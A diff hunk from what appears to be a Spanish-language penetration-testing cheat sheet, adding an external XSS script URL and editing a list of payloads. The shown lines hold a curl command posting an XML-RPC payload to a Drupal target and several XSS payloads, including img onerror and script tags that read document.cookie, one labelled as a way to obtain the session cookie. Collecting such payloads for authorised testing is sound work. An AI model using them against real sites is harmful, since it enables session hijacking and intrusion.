@@ -34,10 +34,11 @@ drupalxml.xml =>
 curl --data @drupalxml.xml IP/xmlrpc.php
 
 #XSS
+http://xss.rocks/xss.js
 <script>alert("test");</script>
         <iframe src=http://URL A MOSTRAR></iframe>
 	**DOM BASED XSS**
-		<img src="path_to_image" />
+		<img src="" />
 		<img src="" onerror="alert(document.cookie)" />
 		<iframe src="javascript:alert('Hacked');" />
         <script>alert(document.cookie)</script> Para obtener la cookie de sesión
